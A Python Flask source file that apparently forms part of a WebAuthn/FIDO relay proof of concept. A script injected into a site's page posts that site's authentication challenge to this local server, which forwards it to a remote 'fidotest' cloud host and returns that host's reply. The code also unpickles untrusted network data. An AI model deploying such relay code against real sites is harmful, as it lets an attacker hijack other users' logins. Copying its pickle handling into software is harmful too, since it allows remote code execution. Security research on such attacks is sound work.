from flask import *
from flask_cors import CORS
import os
import base64
import json
import pickle
import requests
import pyperclip
app = Flask(__name__)
CORS(app)

cloudurl='https://fidotest.eastus.cloudapp.azure.com'

def readInject():
	fl=open('inject.js', 'r')
	txt=fl.read()
	fl.close()
	pyperclip.copy(txt)



def arrToBarr(arr):
	x=bytearray(len(arr))
	for i in range(len(arr)):
		x[i]=arr[i]
	return bytes(x)

def makeOptions(opt):
	#print(opt)
	options={}
	options['challenge']=arrToBarr(opt['challenge'])
	options['rpId']=opt['rpId']
	if 'timeout' in opt:
		options['timeout']=opt['timeout']
	if 'userVerification' in opt:	
		options['userVerification']=opt['userVerification']
	if 'extensions' in opt:
		options['extensions']=opt['extensions']
	ac=[]
	for zz in opt['allowCredentials']:
		cred={}
		cred['type']=zz['type']
		cred['id']=arrToBarr(zz['id'])
		if 'transports' in zz:
			cred['transports']=zz['transports']
		ac.append(cred)
	options['allowCredentials']=ac
	return options		

@app.route("/", methods=["GET","POST"])
def index():
	return "active"
		
@app.route("/getoptions", methods=["GET","POST"])
def getoptions():
	opt= request.json
	url=request.args.get('site')
	options=makeOptions(opt);
	optionsb64=base64.b64encode(pickle.dumps(options)).decode()
	optdata={'optionsb64': optionsb64, 'url': url}
	optdatab64=base64.b64encode(pickle.dumps(optdata)).decode()
	resp1=requests.post(cloudurl+'/getoptions', data={'data':optdatab64})
	res1=resp1.text
	res=pickle.loads(base64.b64decode(res1.encode()))
	return jsonify(res)
	
if __name__=="__main__":
	readInject()
	app.run(host="0.0.0.0", port=5000)
